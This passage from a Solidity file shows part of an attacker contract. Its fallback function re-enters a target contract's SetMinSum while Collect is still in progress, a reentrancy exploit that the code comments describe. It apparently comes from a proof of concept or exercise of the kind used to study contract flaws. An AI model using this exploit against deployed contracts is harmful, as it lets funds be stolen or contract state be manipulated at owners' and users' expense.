    uint targetMinSum;
    constructor(C _c, uint _targetMinSum) payable {
        c = _c;
        targetMinSum = _targetMinSum;
    }
    function attack(uint _am) external {
        c.Collect(_am);
    }
    fallback() external payable {
        // Re-enter via SetMinSum while Collect is in progress (after funds sent, before state update)
        c.SetMinSum(targetMinSum);
    }
}

